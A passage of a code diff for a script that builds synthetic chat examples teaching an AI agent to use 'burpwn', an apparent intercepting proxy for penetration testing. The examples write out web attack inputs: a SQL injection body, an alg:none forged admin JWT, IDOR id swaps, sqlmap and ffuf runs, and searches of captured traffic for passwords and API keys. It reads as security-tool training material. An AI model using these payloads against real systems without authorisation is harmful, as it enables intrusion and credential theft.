-                "and fd 3 gave me "
-                '`{"ok":true,"data":{"captured_request_ids":[12,13,14],'
-                '"exec_id":"exec-3608212-0-1781363759621297073","exit_code":0},'
-                '"error":null}`. What now?'
-            ),
-            assistant=(
-                "The command exited cleanly (`exit_code: 0`) and burpwn captured three "
-                "flows during this run: ids 12, 13 and 14 (typically the A/AAAA DNS "
-                "queries plus the HTTP request). Inspect the HTTP one with "
-                "`burpwn req show 14` (highest id is usually the request, the DNS ones "
-                "are the QUERY flows). You can correlate everything from this run later "
-                "via the `exec_id`."
-            ),
+            tags=["exec", "recon", "python", "script"],
+            turns=[
+                ("user", "Run my Python requests script that hits the API; capture its traffic."),
+                (
+                    "assistant",
+                    "Just run the interpreter under `exec` — the whole process tree's "
+                    "egress is captured:\n\n```\nburpwn exec --timeout 120 -- python3 "
+                    "probe.py\n```\n\nEvery `requests` call the script makes is MITM'd into "
+                    "the store; afterwards `burpwn req list` shows them newest-first.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
-            tags=["exec", "recon", "tool", "ffuf"],
-            user="Run ffuf content discovery against https://acme.com/FUZZ through burpwn.",
-            assistant=(
-                "Wrap the whole ffuf invocation after `--` and give it a generous "
-                "timeout since fuzzing is long-running:\n\n"
-                "```\nburpwn exec --timeout 600 -- ffuf -u https://acme.com/FUZZ "
-                "-w wordlist.txt -mc 200,301,302,403\n```\n\n"
-                "Every probe ffuf makes is captured, so afterwards you can "
-                "`burpwn req list --host acme.com --status 200` to review the hits "
-                "with their real responses."
-            ),
+            tags=["exec", "session-override", "sqlmap"],
+            turns=[
+                (
+                    "user",
+                    "Run a sqlmap probe but attribute it to my 'acme' session, not "
+                    "whatever's active.",
+                ),
+                (
+                    "assistant",
+                    "Pin the session with `--session` (it follows the `exec` token, before "
+                    "`--`):\n\n```\nburpwn exec --session acme --timeout 900 -- sqlmap -u "
+                    '"https://acme.com/item?id=1" --batch\n```\n\nAll of sqlmap\'s payloads '
+                    "are captured under `acme` for later `req list`/`req search`.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["exec", "recon", "workspace"],
-            user="Crawl acme.com with a spider but keep its flows in their own bucket.",
-            assistant=(
-                "Create a workspace and attribute the exec's flows to it by id:\n\n"
-                "```\nburpwn workspace new crawl\nburpwn exec --workspace 2 -- "
-                "katana -u https://acme.com -silent\n```\n\n"
-                "`workspace new crawl` returns the new id (e.g. "
-                "`{\"ok\":true,\"data\":{\"id\":2,\"name\":\"crawl\"},\"error\":null}`); "
-                "pass that **id** to `--workspace`. Later filter with "
-                "`burpwn req list --workspace 2`."
-            ),
+            turns=[
+                ("user", "Crawl the SPA but keep its flows in their own bucket."),
+                (
+                    "assistant",
+                    "Create a workspace and attribute the exec's flows to it by **id**:\n\n"
+                    "```\nburpwn workspace new crawl\nburpwn exec --workspace 2 -- katana -u "
+                    "https://app.fintrack.dev -silent\n```\n\n`workspace new crawl` returns "
+                    'the id (e.g. `{"ok":true,"data":{"id":2,"name":"crawl"},"error":null}`); '
+                    "pass that id to `--workspace`. Later filter with "
+                    "`burpwn req list --workspace 2`.",
+                ),
+            ],
         )
     )
+    return out
 
-    # --- req list / filter ------------------------------------------------ #
+
+def fam_req_list() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+
+    def flow_row(fid: int, t: Target, method: str, path: str, status: int) -> dict[str, Any]:
+        return {
+            "authority": t.host,
+            "dst_ip": t.dst_ip,
+            "dst_port": t.port,
+            "id": fid,
+            "intercepted": False,
+            "method": method,
+            "path": path,
+            "protocol": t.protocol,
+            "scheme": t.scheme,
+            "sni": t.host if t.scheme == "https" else None,
+            "status": status,
+            "ts_end": 1781363726726,
+            "ts_start": 1781363726697,
+            "workspace_id": 1,
+        }
+
+    t = _t("restapi")
     out.append(
         cli_example(
             tags=["req", "list", "interpret"],
-            user="Show me the most recent captured flows.",
-            assistant=(
-                "```\nburpwn --json req list --limit 20\n```\n\n"
-                "Flows come back newest-first as an array. Each row looks like:\n\n"
-                '```json\n{"authority":"acme.com","dst_ip":"104.20.23.154",'
-                '"dst_port":443,"id":14,"intercepted":false,"method":"GET","path":"/",'
-                '"protocol":"h2","scheme":"https","sni":"acme.com","status":200,'
-                '"ts_end":1781363726726,"ts_start":1781363726697,"workspace_id":1}\n```'
-            ),
+            turns=[
+                ("user", "Show me the most recent captured flows."),
+                (
+                    "assistant",
+                    "```\nburpwn --json req list --limit 20\n```\n\nFlows come back "
+                    "newest-first as a bare array under `data`. Each row looks like:\n\n"
+                    "```json\n" + json.dumps(flow_row(41, t, "GET", "/v1/me", 200),
+                                             sort_keys=True) + "\n```",
+                ),
+            ],
         )
     )
-    out.append(
-        cli_example(
-            tags=["req", "list", "filter"],
-            user="List only the successful GET requests to api.acme.com.",
-            assistant=(
-                "Stack the exact-match filters:\n\n"
-                "```\nburpwn req list --host api.acme.com --method GET --status 200\n```\n\n"
-                "`--host` is a substring match against host/SNI/dst-ip; `--method` and "
-                "`--status` are exact. Add `--json` for the array envelope, or "
-                "`--limit`/`--offset` to page."
-            ),
+    # filter combinations across targets
+    filter_cases = [
+        ("--host {host} --method GET --status 200",
+         "List only the successful GET requests to {host}.",
+         "`--host` is a substring match against host/SNI/dst-ip; `--method`/`--status` are "
+         "exact. Add `--json` for the array, or `--limit`/`--offset` to page."),
+        ("--status 500",
+         "Did anything 500? Show me server errors.",
+         "`--status` is an exact match; 500s often reveal stack traces worth a "
+         "`burpwn req show <id> --raw`."),
+        ("--method POST",
+         "Show me every POST that was captured.",
+         "POST bodies are where injection/auth payloads live; pair with "
+         "`burpwn req search` to find specific parameters."),
+        ("--port 8443",
+         "Show flows that went to the non-standard port 8443.",
+         "`--port` is an exact match against `dst_port`; combine with `--host` to narrow."),
+        ("--protocol ws",
+         "Did the app open any websockets?",
+         "Valid `--protocol` values are `h1`, `h2`, `ws`, `dns`, `rawtcp`, `tls-passthru`."),
+        ("--protocol dns",
+         "Show me the DNS lookups the sandbox made.",
+         "DNS flows have `method:\"QUERY\"` and paths like `host./A` and `host./AAAA`."),
+        ("--workspace 3",
+         "Show only the flows in workspace 3.",
+         "`--workspace` takes the numeric id from `workspace new`/`workspace list`."),
+        ("--limit 50 --offset 50",
+         "There are hundreds of flows — give me rows 50 to 100.",
+         "Results are newest-first, so `--offset 50` skips the 50 newest and `--limit 50` "
+         "returns the next page."),
+    ]
+    for flags, ask, note in filter_cases:
+        t = _t("restapi")
+        out.append(
+            cli_example(
+                tags=["req", "list", "filter"],
+                turns=[
+                    ("user", ask.format(host=t.host)),
+                    (
+                        "assistant",
+                        f"```\nburpwn req list {flags.format(host=t.host)}\n```\n\n"
+                        f"{note}",
+                    ),
+                ],
+            )
         )
-    )
-    out.append(
-        cli_example(
-            tags=["req", "list", "filter", "protocol"],
-            user="Did the app open any websockets? Show me only WS flows.",
-            assistant=(
-                "Filter by wire protocol:\n\n"
-                "```\nburpwn req list --protocol ws\n```\n\n"
-                "Valid `--protocol` values are `h1`, `h2`, `ws`, `dns`, `rawtcp`, and "
-                "`tls-passthru`. Use `--protocol dns` to review name resolution, or "
-                "`--protocol tls-passthru` to see cert-pinned hosts that bypassed MITM."
-            ),
-        )
-    )
+    return out
 
-    # --- req show / raw --------------------------------------------------- #
+
+def fam_req_show_search() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+
+    show_detail = {
+        "ok": True,
+        "data": {
+            "client_addr": "10.99.0.1:41516",
+            "dst_ip": "198.51.100.30",
+            "dst_port": 443,
+            "exec_id": None,
+            "id": 41,
+            "intercepted": False,
+            "protocol": "h2",
+            "request": {
+                "authority": "api.shopwave.io",
+                "body": "",
+                "headers": "authorization: Bearer eyJ...\r\naccept: application/json\r\n",
+                "http_version": "HTTP/2.0",
+                "method": "GET",
+                "path": "/v1/me",
+            },
+            "response": {
+                "body": '{"id":1001,"role":"user","email":"a@x.io"}',
+                "headers": "content-type: application/json\r\n",
+                "http_version": "HTTP/2.0",
+                "status": 200,
+                "timing_ms": 29,
+            },
+            "scheme": "https",
+            "sni": "api.shopwave.io",
+            "workspace_id": 1,
+        },
+        "error": None,
+    }
     out.append(
         cli_example(
             tags=["req", "show", "https", "interpret"],
-            user="Show me the decrypted request and response for flow 14.",
-            assistant=(
-                "```\nburpwn --json req show 14\n```\n\n"
-                "Because the traffic was MITM'd, the HTTPS body is decrypted. You get "
-                "the decoded request/response with separate `headers` and `body`:\n\n"
-                '```json\n{"ok":true,"data":{"id":14,"protocol":"h2","scheme":"https",'
-                '"request":{"method":"GET","path":"/","headers":"...","body":""},'
-                '"response":{"status":200,"headers":"...","body":"<!doctype html>..."}},'
-                '"error":null}\n```'
-            ),
+            turns=[
+                ("user", "Show me the decrypted request and response for flow 41."),
+                (
+                    "assistant",
+                    "```\nburpwn --json req show 41\n```\n\nBecause the traffic was MITM'd, "
+                    "the HTTPS body is decrypted. You get the decoded request/response with "
+                    "separate `headers` and `body` (plus `client_addr`, `exec_id`, timing):"
+                    "\n\n```json\n" + json.dumps(show_detail, sort_keys=True) + "\n```\n\n"
+                    "Here `/v1/me` leaks the numeric user id `1001` — a good IDOR candidate.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["req", "show", "raw"],
-            user="I need the byte-exact request and response for flow 14 to craft a PoC.",
-            assistant=(
-                "Use `--raw` to print the verbatim wire bytes instead of the parsed "
-                "summary:\n\n"
-                "```\nburpwn req show 14 --raw\n```\n\n"
-                "This prints the literal request head + body, a blank line, then the "
-                "literal response head + body — ideal for copy-pasting into a report or "
-                "feeding to another tool."
-            ),
+            turns=[
+                ("user", "I need the byte-exact request and response for flow 41 to craft a PoC."),
+                (
+                    "assistant",
+                    "Use `--raw` for the verbatim wire bytes instead of the parsed "
+                    "summary:\n\n```\nburpwn req show 41 --raw\n```\n\nThis prints the literal "
+                    "request head + body, a blank line, then the literal response head + "
+                    "body — ideal to paste into a report or feed another tool.",
+                ),
+            ],
         )
     )
-
-    # --- search ----------------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["req", "search", "interpret"],
-            user="Find any captured flow whose body mentions a password.",
-            assistant=(
-                "Full-text search runs over request/response bodies:\n\n"
-                "```\nburpwn --json req search password\n```\n\n"
-                "It returns matching flow ids, newest-first:\n\n"
-                '```json\n{"ok":true,"data":{"flow_ids":[31,18,9]},"error":null}\n```\n\n'
-                "Then `burpwn req show 31 --raw` on each id to read the match in context. "
-                "The query is an FTS5 expression, so you can do `req search "
-                '"authorization OR bearer"` too.'
-            ),
+    for q, ids in [("password", [31, 18, 9]), ("authorization OR bearer", [41, 37]),
+                   ("flag{", [88]), ("api_key", [55, 23])]:
+        env = {"ok": True, "data": {"flow_ids": ids}, "error": None}
+        out.append(
+            cli_example(
+                tags=["req", "search", "interpret"],
+                turns=[
+                    (
+                        "user",
+                        f"Find any captured flow whose body mentions '{q}'.",
+                    ),
+                    (
+                        "assistant",
+                        "Full-text (FTS5) search runs over request/response bodies:\n\n"
+                        f'```\nburpwn --json req search "{q}"\n```\n\nIt returns matching '
+                        f"flow ids, newest-first:\n\n```json\n{json.dumps(env, sort_keys=True)}"
+                        "\n```\n\nThen `burpwn req show <id> --raw` on each to read the match "
+                        "in context.",
+                    ),
+                ],
+            )
         )
-    )
+    return out
 
-    # --- replay / Repeater (IDOR/authz) ----------------------------------- #
+
+def fam_replay() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    replay_env = (
+        '{"ok":true,"data":{"response":"HTTP/1.1 200 OK\\r\\n'
+        'content-type: application/json\\r\\n\\r\\n{\\"id\\":1002,\\"role\\":\\"user\\"}"},'
+        '"error":null}'
+    )
     out.append(
         cli_example(
-            tags=["req", "replay", "idor"],
-            user=(
-                "Flow 22 is `GET /api/users/1001/profile` with my own token. Test for "
-                "IDOR by replaying it against user 1002."
-            ),
-            assistant=(
-                "Replay (Repeater) the stored flow with the path edited. `req replay` "
-                "doesn't have a `--set-path`, so override the resource via the method/"
-                "headers you can change and re-target by editing the request — here the "
-                "cleanest approach is to replay flow 22 then compare. To change just the "
-                "id, replay and inspect:\n\n"
-                "```\nburpwn --json req replay 22 --set-header "
-                '"X-Original-User: 1002"\n```\n\n'
-                "For path-level IDOR, the supported edits are headers, body and method; "
-                "if the user id is in the URL path, copy the raw request "
-                "(`burpwn req show 22 --raw`), change `1001`→`1002`, and re-issue it via "
-                "`burpwn exec -- curl ...`. The replay envelope returns the new "
-                "`{status, response}` so you can diff it against the original 200."
-            ),
+            tags=["req", "replay", "idor", "bola"],
+            turns=[
+                (
+                    "user",
+                    "Flow 22 is `GET /api/users/1001/profile` with my own token. Test for "
+                    "IDOR/BOLA by hitting user 1002.",
+                ),
+                (
+                    "assistant",
+                    "`req replay` edits headers/body/method but not the URL path, and the id "
+                    "is in the path here. Two options:\n\n"
+                    "1. Copy the raw request, swap the id, and re-issue it:\n```\n"
+                    "burpwn req show 22 --raw   # copy it, change 1001 -> 1002\n"
+                    'burpwn exec -- curl -s -H "Authorization: Bearer <token>" '
+                    "https://api.shopwave.io/api/users/1002/profile\n```\n"
+                    "2. If the id were a header/body field you'd use "
+                    "`burpwn req replay 22 --set-header ...`.\n\nCompare the new response to "
+                    "the original 200 — same profile data for another user = IDOR.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["req", "replay", "authz"],
-            user="Re-send flow 22 but strip the Authorization header to test for missing authz.",
-            assistant=(
-                "Override the header to empty (or to a junk value) and replay:\n\n"
-                "```\nburpwn --json req replay 22 --set-header \"Authorization: \"\n```\n\n"
-                "The envelope echoes the live response:\n\n"
-                '```json\n{"ok":true,"data":{"status":200,"response":"HTTP/1.1 200 OK\\r\\n'
-                '..."},"error":null}\n```\n\n'
-                "If the endpoint still returns `200` with data, it is missing "
-                "authentication. A `401`/`403` is the expected, secure behaviour. "
-                "`--set-header` takes `Name: value` or `Name=value` and is repeatable."
-            ),
+            turns=[
+                ("user", "Re-send flow 22 but strip the Authorization header to test missing authz."),
+                (
+                    "assistant",
+                    "Override the header to empty and replay:\n\n```\n"
+                    'burpwn --json req replay 22 --set-header "Authorization: "\n```\n\n'
+                    f"The envelope echoes the live response as a string:\n\n```json\n{replay_env}"
+                    "\n```\n\nIf the endpoint still returns `200` with data, it's missing "
+                    "authentication; a `401`/`403` is the secure behaviour. `--set-header` "
+                    "takes `Name: value` or `Name=value` and is repeatable. Note the replay "
+                    "envelope is just `{response: \"<raw HTTP>\"}` — there is no separate "
+                    "`status` field, so parse the status line of the string.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["req", "replay", "method", "body"],
-            user="Replay flow 30 as a POST with a tampered JSON body from payload.json.",
-            assistant=(
-                "Override the method and read the body from a file with `@`:\n\n"
-                "```\nburpwn req replay 30 --method POST --set-body @payload.json "
-                '--set-header "Content-Type: application/json"\n```\n\n'
-                "`--set-body` accepts a literal string or `@file`; `--method` overrides "
-                "the verb. The original flow is untouched — replay always issues a fresh "
-                "request and returns its response."
-            ),
+            turns=[
+                ("user", "Replay flow 30 as a POST with a tampered JSON body from payload.json."),
+                (
+                    "assistant",
+                    "Override the method and read the body from a file with `@`:\n\n```\n"
+                    "burpwn req replay 30 --method POST --set-body @payload.json "
+                    '--set-header "Content-Type: application/json"\n```\n\n`--set-body` '
+                    "accepts a literal string or `@file`; `--method` overrides the verb. The "
+                    "original flow is untouched — replay always issues a fresh request and "
+                    "returns its response string.",
+                ),
+            ],
         )
     )
-
-    # --- intercept (live tamper) ----------------------------------------- #
+    # JWT / SQLi / open-redirect replays
     out.append(
         cli_example(
-            tags=["intercept", "workflow", "tamper"],
-            user=(
-                "I want to manually tamper the next request the app sends — add an admin "
-                "header before it goes out."
-            ),
-            assistant=(
-                "Enable interception, wait for the next request to park, then forward it "
-                "with the header added:\n\n"
-                "```\nburpwn intercept enable\nburpwn --json intercept await --timeout 60\n```\n\n"
-                "`await` returns the parked item with its id, e.g. "
-                '`{"ok":true,"data":{"type":"Pending","item":{"id":1,...}}}`. Forward '
-                "that id with the edit:\n\n"
-                "```\nburpwn intercept forward 1 --set-header \"X-Admin: true\"\n```\n\n"
-                "If `await` times out with no traffic you get "
-                '`{"ok":true,"data":{"type":"Pending","item":null},"error":null}` — just '
-                "poll again. Run `burpwn intercept disable` when you're done."
-            ),
+            tags=["req", "replay", "jwt"],
+            turns=[
+                (
+                    "user",
+                    "Flow 44 carries a JWT in the Authorization header. Replay it with an "
+                    "alg:none forged token to test verification.",
+                ),
+                (
+                    "assistant",
+                    "Swap the header value for your crafted token and replay:\n\n```\n"
+                    'burpwn req replay 44 --set-header '
+                    '"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."\n```\n\n'
+                    "A `200` with admin data means the server trusts an unsigned `alg:none` "
+                    "token — a critical JWT verification flaw. A `401` is correct behaviour.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["req", "replay", "sqli"],
+            turns=[
+                (
+                    "user",
+                    "Flow 17 is a search POST. Replay it with a SQLi probe in the body to see "
+                    "if the response changes.",
+                ),
+                (
+                    "assistant",
+                    "Replace the body with the payload and replay:\n\n```\n"
+                    "burpwn req replay 17 --set-body \"q=test' OR '1'='1\"\n```\n\nDiff the "
+                    "returned response string against the original: extra rows, a SQL error, "
+                    "or a timing change all suggest injection. Then drive `sqlmap` under "
+                    "`burpwn exec` on the same endpoint to confirm and exploit.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+def fam_intercept_cli() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    out.append(
+        cli_example(
+            tags=["intercept", "workflow", "tamper", "multi-step"],
+            turns=[
+                (
+                    "user",
+                    "I want to manually tamper the next request the app sends — add an admin "
+                    "header before it goes out.",
+                ),
+                (
+                    "assistant",
+                    "Enable interception, then long-poll for the next parked request:\n\n```\n"
+                    "burpwn intercept enable\nburpwn --json intercept await --timeout 60\n```\n\n"
+                    "`enable` returns `{\"ok\":true,\"data\":{\"type\":\"Ack\"},\"error\":null}`. "
+                    "`await` parks the next request and returns it.",
+                ),
+                (
+                    "user",
+                    'It returned `{"ok":true,"data":{"type":"Pending","item":{"id":1,'
+                    '"kind":"request","host":"acme.com","method":"POST","path":"/cart/checkout"}},'
+                    '"error":null}`. Add the header and let it go.',
+                ),
+                (
+                    "assistant",
+                    "Forward that id with the edit:\n\n```\n"
+                    'burpwn intercept forward 1 --set-header "X-Admin: true"\n```\n\nA '
+                    'successful release returns `{"ok":true,"data":{"type":"Resolved",'
+                    '"found":true},"error":null}`. Run `burpwn intercept disable` when '
+                    "you're done.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["intercept", "drop"],
-            user="A telemetry beacon got parked as intercept id 3 — I don't want it sent. Kill it.",
-            assistant=(
-                "Drop the parked intercept so it is never forwarded:\n\n"
-                "```\nburpwn intercept drop 3\n```\n\n"
-                "A successful drop returns "
-                '`{"ok":true,"data":{"type":"Resolved","found":true},"error":null}`. If '
-                "`found` is `false`, that id was already forwarded/dropped or never "
-                "existed."
-            ),
+            turns=[
+                (
+                    "user",
+                    "A telemetry beacon got parked as intercept id 3 — I don't want it sent. "
+                    "Kill it.",
+                ),
+                (
+                    "assistant",
+                    "Drop the parked intercept so it's never forwarded:\n\n```\n"
+                    "burpwn intercept drop 3\n```\n\nReturns "
+                    '`{"ok":true,"data":{"type":"Resolved","found":true},"error":null}`. If '
+                    "`found` is `false`, that id was already resolved or never existed.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["intercept", "list"],
-            user="What requests are currently held by the interceptor?",
-            assistant=(
-                "```\nburpwn --json intercept list\n```\n\n"
-                "Returns the parked items:\n\n"
-                '```json\n{"ok":true,"data":{"type":"Intercepts","items":[]},'
-                '"error":null}\n```\n\n'
-                "An empty `items` array means nothing is currently parked (or "
-                "interception is disabled)."
-            ),
-        )
-    )
-
-    # --- match/replace ---------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["match-replace", "auth-inject"],
-            user="Inject a fixed bearer token into every request to all hosts.",
-            assistant=(
-                "Add a request-side match/replace rule on the `header` kind with an "
-                "empty scope (= all hosts):\n\n"
-                "```\nburpwn match-replace add \"\" header Authorization "
-                '"Bearer eyJhbGciOi..."\n```\n\n'
-                "It returns the new rule id: `{\"ok\":true,\"data\":{\"id\":1},"
-                "\"error\":null}`. Arguments are `<SCOPE> <KIND> <PATTERN> "
-                "<REPLACEMENT>`; `--on request` is the default (use `--on response` to "
-                "rewrite responses instead). Every subsequent `exec` request now carries "
-                "the header."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["match-replace", "list", "interpret"],
-            user="What match/replace rules are active?",
-            assistant=(
-                "```\nburpwn --json match-replace list\n```\n\n"
-                "Each rule shows its id, scope, kind, pattern, replacement, direction and "
-                "enabled flag:\n\n"
-                '```json\n{"ok":true,"data":[{"enabled":true,"id":1,"match_kind":"header",'
-                '"on_request":true,"pattern":"Authorization","replacement":"Bearer ...",'
-                '"scope":""}],"error":null}\n```'
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["match-replace", "scope", "response"],
-            user="On only *.acme.com responses, rewrite the string PRODUCTION to STAGING.",
-            assistant=(
-                "Scope it to the host glob, match on the `body` kind, and apply on "
-                "responses:\n\n"
-                "```\nburpwn match-replace add \"*.acme.com\" body PRODUCTION STAGING "
-                "--on response\n```\n\n"
-                "`<SCOPE>` is a host glob (empty = all hosts), `<KIND>` is one of "
-                "`header|body|url|host`, and `--on response` flips it from the default "
-                "request direction."
-            ),
-        )
-    )
-
-    # --- tag / note ------------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["tag", "triage"],
-            user="Flag flow 14 as a candidate SQL injection so I can find it later.",
-            assistant=(
-                "```\nburpwn tag add 14 sqli\n```\n\n"
-                "Arguments are `<FLOW_ID> <NAME>`; the tag is created if it doesn't "
-                "exist. Returns `{\"ok\":true,\"data\":{\"flow_id\":14,\"name\":\"sqli\","
-                "\"tag_id\":2},\"error\":null}`."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["note", "triage"],
-            user="Add a note to flow 14 reminding me the id param looked injectable.",
-            assistant=(
-                "```\nburpwn note add 14 \"id param reflects unescaped in SQL error\"\n```\n\n"
-                "Arguments are `<FLOW_ID> <TEXT>`. Returns "
-                '`{"ok":true,"data":{"flow_id":14,"note_id":1},"error":null}`.'
-            ),
-        )
-    )
-
-    # --- export ----------------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["export", "har"],
-            user="Export all captured traffic to a HAR file for the report.",
-            assistant=(
-                "```\nburpwn export har -o acme-session.har\n```\n\n"
-                "Writes an HAR 1.2 document; without `-o` it prints to stdout. Scope it "
-                "with `--workspace <id>` to export just one bucket. The document is "
-                "`{\"log\":{\"version\":\"1.2\",\"creator\":{\"name\":\"burpwn\",...},"
-                "\"entries\":[...]}}`."
-            ),
-        )
-    )
-
-    # --- workspaces ------------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["workspace", "organise"],
-            user="Group this target's flows under a workspace called 'login-flow'.",
-            assistant=(
-                "Create the workspace, then attribute traffic to it by passing its **id** "
-                "to `exec`/`req` (the `workspace use` command is informational only):\n\n"
-                "```\nburpwn workspace new login-flow\nburpwn exec --workspace 3 -- "
-                "curl -s https://acme.com/login\nburpwn req list --workspace 3\n```\n\n"
-                "`workspace new` returns the id to use; `workspace use <name>` merely "
-                "records the choice in config and does not auto-scope, so always pass "
-                "`--workspace <id>` explicitly."
-            ),
-        )
-    )
-
-    # --- choosing CLI vs MCP --------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["meta", "mcp-vs-cli"],
-            user="Should I drive burpwn via the shell or over MCP from my agent?",
-            assistant=(
-                "Both expose the same engine. Use the **CLI** (`burpwn <cmd> --json`) "
-                "for ad-hoc shell work, scripting and piping. Use the **MCP server** "
-                "(`burpwn mcp`, stdio) when an LLM agent should call burpwn as tools — it "
-                "exposes 19 tools (`req_list`, `req_show`, `req_search`, `req_replay`-"
-                "equivalent via `exec`, `intercept_*`, `match_replace_*`, `tag_add`, "
-                "`note_add`, `exec`, …) with typed JSON arguments. The MCP `exec` returns "
-                "`{exit_code, captured_request_ids, exec_id}` directly in the tool result."
-            ),
-        )
-    )
-
-    # --- NEGATIVE / disambiguation --------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["negative", "export", "pcap"],
-            user="Export the session as a pcap so I can open it in Wireshark.",
-            assistant=(
-                "pcap export is **not implemented** — the command errors clearly:\n\n"
-                '```json\n{"ok":false,"data":null,"error":"pcap export is not yet '
-                'implemented (use `export har`)"}\n```\n\n'
-                "Use HAR instead: `burpwn export har -o acme.har`. Most HTTP-analysis "
-                "tooling imports HAR, and it preserves the decrypted bodies that a pcap "
-                "of MITM'd TLS would not."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["negative", "match-replace", "rm"],
-            user="Remove match/replace rule 1.",
-            assistant=(
-                "Heads up: `match-replace rm`, `enable` and `disable` are **not yet "
-                "supported** in the current build — the store writer only exposes "
-                "add + list for rules. Attempting it errors:\n\n"
-                "```\nburpwn: match-replace rm/enable/disable are not yet supported: the "
-                "store writer exposes only add + list for rules (no update/delete API)\n```\n\n"
-                "Workaround: rules apply only while the proxy daemon is running for the "
-                "session, so to clear a rule today you stop/restart the session's daemon "
-                "(or start a fresh session). Re-add the rules you still want with "
-                "`match-replace add`."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["negative", "dns"],
-            user=(
-                "Does name resolution even work inside the sandbox, or do I have to use raw "
-                "IPs?"
-            ),
-            assistant=(
-                "DNS works — hostnames resolve normally. burpwn runs a DNS resolver inside "
-                "the namespace and **captures the lookups too**: you'll see them as `dns` "
-                "protocol flows with `method:\"QUERY\"` and paths like "
-                "`acme.com./A` / `acme.com./AAAA`. So `burpwn exec -- curl https://acme.com` "
-                "is fine; review the resolution with `burpwn req list --protocol dns`."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["negative", "tls-passthru", "pinning"],
-            user="One host's requests show up as 'tls-passthru' with no decrypted body. Why?",
-            assistant=(
-                "That host is **certificate-pinned** (or otherwise refused burpwn's CA), "
-                "so burpwn could not MITM it and let the TLS pass through untouched — "
-                "hence the `tls-passthru` protocol and no plaintext. You can still see the "
-                "flow metadata (SNI, dst ip/port, timing) via "
-                "`burpwn req list --protocol tls-passthru`, but not the decrypted body. "
-                "To inspect it you'd need to defeat the pinning in the client itself; "
-                "burpwn deliberately doesn't break pinned connections."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["negative", "llm-traffic"],
-            user=(
-                "If I run my AI agent under `burpwn exec`, won't burpwn capture the agent's "
-                "own calls to the LLM API and pollute the flows?"
-            ),
-            assistant=(
-                "No. burpwn is designed so the **agent's own LLM traffic stays outside the "
-                "sandbox** and is never captured — only the commands you launch via "
-                "`burpwn exec -- <cmd>` (the actual pentest tooling) have their network "
-                "forced through the proxy. So `req list` shows the target's traffic, not "
-                "your model API calls."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["negative", "req-show", "missing"],
-            user="I ran `burpwn req show 999` and it said `burpwn: no such flow: 999`. Bug?",
-            assistant=(
-                "Not a bug — flow 999 doesn't exist in the active session's store. List "
-                "what's actually captured first with `burpwn --json req list` and use a "
-                "real id from the `id` field. Also confirm you're on the right session "
-                "(`burpwn session list`); flows are per-session, so an id from another "
-                "session won't resolve here."
-            ),
-        )
-    )
-
-    # --- extra coverage --------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["exec", "session-override"],
-            user="Run a sqlmap probe but attribute it to my 'acme' session, not whatever's active.",
-            assistant=(
-                "Pin the session explicitly with `--session` (it must follow the `exec` "
-                "token, before `--`):\n\n"
-                "```\nburpwn exec --session acme --timeout 900 -- sqlmap -u "
-                '"https://acme.com/item?id=1" --batch\n```\n\n'
-                "Without `--session` it uses the active session from `session list`. All "
-                "of sqlmap's payloads are captured under `acme` for later `req list`/"
-                "`req search`."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["req", "list", "port"],
-            user="Show flows that went to a non-standard port, like 8443.",
-            assistant=(
-                "Filter by exact destination port:\n\n"
-                "```\nburpwn req list --port 8443\n```\n\n"
-                "`--port` is an exact match against `dst_port`. Combine with `--host` to "
-                "narrow to one target's alternate port."
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["workflow", "recon-triage", "multi-step"],
-            user=(
-                "Walk me through a quick flow: fetch the login page, find the form action in "
-                "the capture, and flag it."
-            ),
-            assistant=(
-                "1. Capture the page:\n"
-                "```\nburpwn exec -- curl -s https://acme.com/login\n```\n"
-                "2. Find which flow holds the form (full-text search the body):\n"
-                "```\nburpwn --json req search \"<form\"\n```\n"
-                "   → `{\"ok\":true,\"data\":{\"flow_ids\":[14]},\"error\":null}`\n"
-                "3. Read it and tag it for follow-up:\n"
-                "```\nburpwn req show 14 --raw\nburpwn tag add 14 login-form\n"
-                "burpwn note add 14 \"POST action=/auth, has CSRF token field\"\n```"
-            ),
-        )
-    )
-    out.append(
-        cli_example(
-            tags=["req", "list", "pagination"],
-            user="There are hundreds of flows — give me rows 50 to 100.",
-            assistant=(
-                "Page with `--limit` and `--offset`:\n\n"
-                "```\nburpwn req list --limit 50 --offset 50\n```\n\n"
-                "Results are newest-first, so `--offset 50` skips the 50 most recent and "
-                "`--limit 50` returns the next 50."
-            ),
+            turns=[
+                ("user", "What requests are currently held by the interceptor?"),
+                (
+                    "assistant",
+                    "```\nburpwn --json intercept list\n```\n\nReturns the parked items:\n\n"
+                    '```json\n{"ok":true,"data":{"type":"Intercepts","items":[]},'
